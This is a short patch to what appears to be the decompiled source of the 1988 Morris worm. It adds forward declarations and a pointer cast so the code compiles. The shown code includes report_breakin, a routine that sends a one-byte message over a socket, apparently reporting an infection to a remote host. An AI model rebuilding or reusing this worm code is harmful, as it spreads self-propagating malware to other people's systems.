@@ -17,6 +17,8 @@
 
 extern errno;
 extern char *malloc();
+static report_breakin(arg1, arg2);
+static mainloop();
 
 int pleasequit;					/* See worm.h */
 int nobjects = 0;
@@ -158,7 +160,7 @@ static report_breakin(arg1, arg2)		/* 0x2494 */
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0)
 	return;
-    if (sendto(s, &msg, 1, 0, &sin, sizeof(sin)))
+    if (sendto(s, &msg, 1, 0, (struct sockaddr *)&sin, sizeof(sin)))
 	;
     close(s);
 }
